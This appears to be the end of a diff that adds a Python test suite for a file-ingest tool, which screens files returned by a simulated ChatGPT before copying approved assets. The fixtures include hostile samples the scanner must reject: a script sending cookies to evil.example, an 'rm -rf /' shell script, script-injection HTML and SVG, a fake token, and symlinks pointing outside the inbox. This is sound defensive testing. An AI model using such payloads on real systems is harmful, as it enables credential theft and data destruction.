+          pr[:4] == [("money-risk-budget", "done"), ("res-prop-rules", "done"), ("copy-tooltips", "done"), ("icons", "question")] and pr[4] is None and pr[5] is None and pr[6] is None and pr[7] is None and pr[8] is None, pr)
+    nf = I.handback("Bridge: no-such-job done", os.path.join(t, "handoff", "inbox"))
+    bad = I.handback("please do the thing", os.path.join(t, "handoff", "inbox"))
+    fin = fake_chatgpt(inbox, {"id": "waiting-job", "title": "Waiting job", "files": ["a.md", "DONE.md"]}, with_done=False)
+    wait = I.handback("Bridge: waiting-job done", inbox)
+    put(inbox, "asking-job/QUESTION.md", "Which colour do you want?")
+    ask = I.handback("Bridge: asking-job done", inbox)
+    check("g. hand-back edge cases, each ONE plain sentence: unknown job ('cannot find a folder'), not understood, ChatGPT not finished (no DONE.md), ChatGPT has a question (QUESTION.md)",
+          "cannot find a folder called no-such-job" in nf["sentence"] and not nf["ok"] and "did not understand" in bad["sentence"] and not bad["ok"] and "not finished" in wait["sentence"] and not wait["ok"]
+          and "has a question" in ask["sentence"] and not ask["ok"] and all(s["sentence"].count("\n") == 0 for s in (nf, bad, wait, ask)), (nf, bad, wait, ask))
+    # 5. hostile / oversized / wrong-type files from the fake ChatGPT, one job
+    hid = "tex-gold-brushed"
+    hostile = {
+        "gold-albedo.png": png(8, 8),
+        "evil.js": "fetch('https://evil.example/steal?x=' + document.cookie);",
+        "fake.png": "<html><script>alert(1)</script></html>",
+        "huge.png": png(8, 8) + b"\0" * (6 * 1024 * 1024),
+        "setup.exe": b"MZ\x90\x00" + b"\0" * 64,
+        "page.html": "<html><body>hi</body></html>",
+        "run.sh": "#!/bin/sh\nrm -rf /\n",
+        "tool.py": "import os\nos.system('x')\n",
+        "script.svg": '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
+        "notes.md": "<script>alert(1)</script> hello",
+        "key.txt": "my token is ghp_" + "a1B2c3D4e5F6g7H8i9J0" * 2,
+        "bad.json": "{ not json",
+        "bad;name.md": "hello",
+        "double.png.exe": b"MZ\x90\x00",
+        "big.md": "x" * (300 * 1024),
+        ".env": "SECRET=1",
+        "empty.txt": "",
+        "DONE.md": "Made the gold. Files: gold-albedo.png and some others.",
+    }
+    for name, data in hostile.items():
+        put(os.path.join(inbox, hid), name, data)
+    os.symlink("/etc/hostname", os.path.join(inbox, hid, "link.txt"))
+    os.makedirs(os.path.join(t, "outside"))
+    open(os.path.join(t, "outside", "secret.md"), "w").write("outside the inbox")
+    os.symlink(os.path.join(t, "outside"), os.path.join(inbox, hid, "folder-link"))
+    put(os.path.join(inbox, hid), "a/b/c/d/deep.md", "too deep")
+    snap2 = tree_hash(t)
+    outside_before = tree_hash(os.path.join(t, "outside"))
+    res = I.scan_job(os.path.join(inbox, hid), hid)
+    rows = {f["name"]: f for f in res["files"]}
+    rejected = {n for n, f in rows.items() if not f["ok"]}
+    must = {"evil.js", "fake.png", "huge.png", "setup.exe", "page.html", "run.sh", "tool.py", "script.svg", "notes.md", "key.txt", "bad.json", "bad;name.md", "double.png.exe", "big.md", ".env", "empty.txt", "link.txt"}
+    check("g. every hostile, oversized, wrong-type or odd file is rejected, the good picture and DONE.md are approved, and one bad file never hides the others",
+          must <= rejected and rows["gold-albedo.png"]["ok"] and rows["DONE.md"]["ok"] and res["state"] == "done" and res["approved"] == 1, sorted(must - rejected))
+    plain = {n: rows[n].get("plain", "") for n in must}
+    check("g. every rejection comes with ONE plain sentence (a capital letter, one full stop, no technical words like fetch / eval / symlink / UTF)",
+          all(SAFE_SENTENCE.match(s) and s.count(". ") == 0 and not JARGON.search(s) for s in plain.values()), {n: s for n, s in plain.items() if not (SAFE_SENTENCE.match(s) and s.count(". ") == 0 and not JARGON.search(s))})
+    check("g. the sentences say the right thing: a program that reaches the internet, a fake picture, too big, a file type that is not allowed, a hidden program, a secret key, a broken data file, a shortcut",
+          "reach the internet" in plain["evil.js"] and "not a real picture" in plain["fake.png"] and "too big" in plain["huge.png"] and "not allowed" in plain["setup.exe"] and "hidden program" in plain["script.svg"]
+          and "secret key" in plain["key.txt"] and "broken" in plain["bad.json"] and "shortcut" in plain["link.txt"] and "odd characters" in plain["bad;name.md"] and "empty" in plain["empty.txt"], plain)
+    check("g. nothing is followed outside the job: the shortcut to /etc/hostname and the shortcut to a folder outside are not read, the deep folder is ignored, the outside folder is unchanged",
+          "link.txt" in rejected and not any(n.startswith("folder-link") or n.startswith("a/b/c/d") for n in rows) and tree_hash(os.path.join(t, "outside")) == outside_before)
+    rc, out = run("tools/bridge_ingest.py", "--handback", f"Bridge: {hid} done")
+    check("g. the hand-back for the hostile job says what was kept and what was not, in plain words (1 file passed, the first three problems named)", out.startswith(f"{hid}: ChatGPT is done. 1 file passed the safety check and") and "not used." in out and "reach the internet" in out and "\n" not in out.strip(), out)
+    # 6. 'apply' copies only the approved picture, nothing is written outside handoff/ by the read-only runs
+    snap3 = tree_hash(t)
+    rc, out = run("tools/bridge_ingest.py")
+    check("g. the plain report run on the hostile inbox is read-only too (the temp tree is byte-identical)", rc == 0 and tree_hash(t) == snap3 and "REJECTED evil.js" in out and "reach the internet" in out)
+    rc, out = run("tools/bridge_ingest.py", "--apply")
+    after = tree_hash(t)
+    new = sorted(k for k in after if k not in snap3)
+    check("g. '--apply' writes only tools/web_public/olympus/assets/ (the good picture + its manifest + the index), never a rejected file, never the inbox",
+          rc == 0 and all(k.startswith("tools/web_public/olympus/assets/") for k in new) and "tools/web_public/olympus/assets/tex-gold-brushed/gold-albedo.png" in new
+          and not any(n in " ".join(new) for n in ("evil", "fake", "huge", "setup", "key.txt", "link")) and all(after[k] == snap3[k] for k in snap3), new)
+    man = json.load(open(os.path.join(t, "tools", "web_public", "olympus", "assets", hid, "manifest.json"), encoding="utf-8"))
+    check("g. the manifest lists the one approved picture with its size and checksum and every rejected file with its reason", [f["name"] for f in man["files"]] == ["gold-albedo.png"] and len(man["rejected"]) >= len(must) - 1, man["rejected"][:2])
+    # 7. the owner's most likely slips: a folder named in capitals, a file dropped outside a job folder
+    put(inbox, "Money-Risk-Budget/notes.md", "hello")
+    put(inbox, "logo.png", png(4, 4))
+    rc, out = run("tools/bridge_ingest.py")
+    check("g. a folder with capital letters and a file dropped outside any job folder are skipped, and the report says so in plain words (the owner's most likely slips)",
+          "The folder 'Money-Risk-Budget' was skipped" in out and "The file 'logo.png' was skipped: files belong inside a folder named after the job." in out, out[-400:])
+    # 8. the real repo was never touched by any of this
+    after_real = [tree_hash(d) for d in real_places]
+    check("g. the real handoff/, Bridge page and Olympus assets folders were not changed by the rehearsal (it ran in a temp copy)", after_real == before)
+    page = open(os.path.join(ROOT, "tools", "web_public", "bridge", "index.html"), encoding="utf-8").read()
+    check("g. the page's hand-back button builds exactly the text the ingest understands ('Bridge: ' + id + ' done' / ' question')", "'Bridge: ' + j.id + (st && st.state === 'question' ? ' question' : ' done')" in page and "'Bridge: ' + id + ' done'" in page)
+
+
+def main():
+    part_library()
+    part_validate()
+    inbox, res = part_scan()
+    part_prepare(inbox, res)
+    part_never_runs()
+    part_suggest()
+    part_rehearsal()
+    for d in TMPS:
+        shutil.rmtree(d, ignore_errors=True)
+    n = sum(RES)
+    print(f"\nbridge ingest: {n}/{len(RES)} " + ("ALL PASS" if n == len(RES) else "FAILED"))
+    return 0 if n == len(RES) else 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
